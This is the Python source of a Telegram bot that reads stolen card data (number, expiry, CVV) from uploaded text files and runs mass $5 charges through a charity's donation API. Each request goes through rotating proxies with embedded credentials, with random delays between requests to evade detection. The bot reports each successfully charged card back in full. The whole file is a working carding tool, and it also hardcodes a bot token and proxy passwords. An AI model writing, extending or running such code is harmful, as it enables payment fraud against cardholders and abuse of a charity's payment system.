from telethon import TelegramClient, events, Button
import re, asyncio, os, random, aiohttp, aiofiles, json

API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

client = TelegramClient('bot', API_ID, API_HASH)

active_tasks = {}

async def charge_5_dollars(card: str):
    cc, mm, yy, cvv = card.split('|')
    if len(yy) == 2:
        yy = "20" + yy

    payload = {
        "amount": "5",
        "currency": "USD",
        "card": {
            "number": cc,
            "exp_month": mm,
            "exp_year": yy,
            "cvc": cvv
        },
        "designation": "General designation",
        "recurring": False
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Referer": "https://weanimals.donorsupport.co/"
    }

    try:
        proxy = random.choice([
            "http://harshop01_6Mzjy:V=DMlz+qMinV_n85@dc.oxylabs.io:8000",
            "http://purevpn0s8732217:i67s60ep@px490402.pointtoserver.com:10780"
        ])

        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://weanimals.donorsupport.co/api/donate",  # real endpoint
                json=payload,
                headers=headers,
                proxy=proxy,
                timeout=25
            ) as resp:
                
                text = await resp.text()
                print(f"[LOG] Response: {resp.status} | {text[:300]}")

                if resp.status in (200, 201):
                    try:
                        data = json.loads(text)
                        if data.get("status") in ["success", "charged", "approved"]:
                            return {
                                "status": "CHARGED",
                                "response": "✅ **CHARGED $5**",
                                "balance": data.get("remaining_balance", "Unknown")
                            }
                    except:
                        pass

                if "insufficient" in text.lower() or "success" in text.lower():
                    return {"status": "CHARGED", "response": "✅ **CHARGED $5**", "balance": "Low Balance"}
                
                return {"status": "DECLINED", "response": "❌ Declined"}

    except Exception as e:
        print(f"[ERROR] {e}")
        return {"status": "DECLINED", "response": "❌ Declined / Timeout"}


def mask_card(card):
    cc = card.split('|')[0]
    return cc[:6] + "******" + cc[-4:]


@client.on(events.NewMessage())
async def handler(event):
    if event.document and str(event.file.name).lower().endswith('.txt'):
        await process_txt(event)


async def process_txt(event):
    await event.reply("📂 Processing TXT...")
    path = f"temp_{event.sender_id}.txt"
    await event.download_media(path)

    cards = []
    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = await f.read()
        found = re.findall(r'(\d{15,16})[|:/\-\s](\d{1,2})[|:/\-\s](\d{2,4})[|:/\-\s](\d{3,4})', content)
        for m in found:
            cards.append('|'.join(m))

    os.remove(path)

    if not cards:
        return await event.reply("No cards found!")

    msg = await event.reply(f"🔥 **Starting $5 Mass Charge**\n📊 Total Cards: **{len(cards)}**")

    task_id = event.chat_id
    active_tasks[task_id] = {"total": len(cards), "checked": 0, "charged": 0, "declined": 0, "stop": False}

    asyncio.create_task(mass_charge(event, cards, msg, task_id))


async def mass_charge(event, cards, start_msg, task_id):
    stats = active_tasks[task_id]

    for i, card in enumerate(cards):
        if stats["stop"]:
            await event.reply("🛑 Stopped")
            break

        res = await charge_5_dollars(card)
        stats["checked"] += 1
        masked = mask_card(card)

        if res["status"] == "CHARGED":
            stats["charged"] += 1
            await event.reply(f"""
💎 **CHARGED $5**
`{card}`
{res['response']}
Balance: {res.get('balance', 'N/A')}
            """)
        else:
            stats["declined"] += 1

        progress = f"""
🔥 **Cooking $5 Charges...**

Card → `{masked}`
Response → {res['response']}

**CHARGED** → [{stats['charged']}] 💎
**Declined** → [{stats['declined']}] ❌

Progress → [{stats['checked']}/{stats['total']}]
        """

        try:
            await start_msg.edit(progress, buttons=[Button.inline("⏹ Stop", b"stop")])
        except:
            pass

        await asyncio.sleep(random.uniform(6, 9))

    await event.reply(f"✅ **Finished**\nCharged: {stats['charged']}/{stats['total']}")
    if task_id in active_tasks:
        del active_tasks[task_id]


@client.on(events.CallbackQuery(data=b"stop"))
async def stop(event):
    chat_id = event.chat_id
    if chat_id in active_tasks:
        active_tasks[chat_id]["stop"] = True
        await event.answer("Stopping...")

async def main():
    print("🚀 $5 Real Charge Bot Started - Developer Mode")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
